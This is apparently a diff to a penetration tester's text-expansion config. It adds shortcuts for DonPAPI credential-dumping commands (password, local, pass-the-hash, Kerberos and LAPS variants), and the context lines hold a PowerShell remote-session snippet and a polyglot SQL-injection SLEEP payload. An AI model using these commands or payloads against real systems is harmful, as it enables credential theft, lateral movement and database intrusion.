@@ -69,6 +69,22 @@ matches:
       $cred = New-Object System.Management.Automation.PSCredential($user,$password)
       Enter-PSSession -ComputerName  -Credential $cred -Authentication Negotiate
 
+  #### Donpapi
+  - trigger: ":donpapi_domain"
+    replace: donpapi domain/user:passw0rd@target
+
+  - trigger: ":donpapi_local"
+    replace: donpapi -local_auth domain/user:passw0rd@target
+
+  - trigger: ":donpapi_pth"
+    replace: donpapi --hashes <LM>:<NT> domain/user@target
+
+  - trigger: ":donpapi_kerberos"
+    replace: "donpapi -k domain/user@target"
+
+  - trigger: ":donpapi_laps"
+    replace: "donpapi -laps domain/user@target"
+
   #### SQL Injection
   - trigger: ":sqli_poly"
     replace: 'SLEEP(1) /*'' or SLEEP(1) or ''" or SLEEP(1) or "*/'
